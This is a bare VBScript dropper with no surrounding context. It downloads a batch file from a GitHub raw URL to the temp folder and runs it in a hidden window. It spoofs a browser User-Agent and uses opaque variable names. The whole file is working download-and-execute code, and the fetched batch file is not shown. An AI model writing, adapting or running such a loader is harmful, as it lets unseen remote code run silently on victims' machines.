Dim x1,x2,x3,x4,x5,x6,x7
x1="MSXML2.XMLHTTP"
x2="Scripting.FileSystemObject"
x3="WScript.Shell"
x4="https://raw.githubusercontent.com/UltimateSkidder/vihdih/main/script.bat"
x5="ADODB.Stream"

Set x6=CreateObject(x1)
Set x7=CreateObject(x2)
Set x8=CreateObject(x3)

x9=x8.ExpandEnvironmentStrings("%TEMP%")+"\s.bat"

On Error Resume Next
x6.Open "GET",x4,False
x6.setRequestHeader "User-Agent","Mozilla/5.0"
x6.Send

If Err.Number<>0 Then
MsgBox "Connection Error: "+Hex(Err.Number),16,"Error"
WScript.Quit
End If

If x6.Status=200 Then
Set x10=CreateObject(x5)
x10.Type=1
x10.Open
x10.Write x6.ResponseBody
x10.SaveToFile x9,2
x10.Close
x8.Run "cmd /c """+x9+"""",0,False
Else
MsgBox "HTTP Error: "+CStr(x6.Status),16,"Error"
End If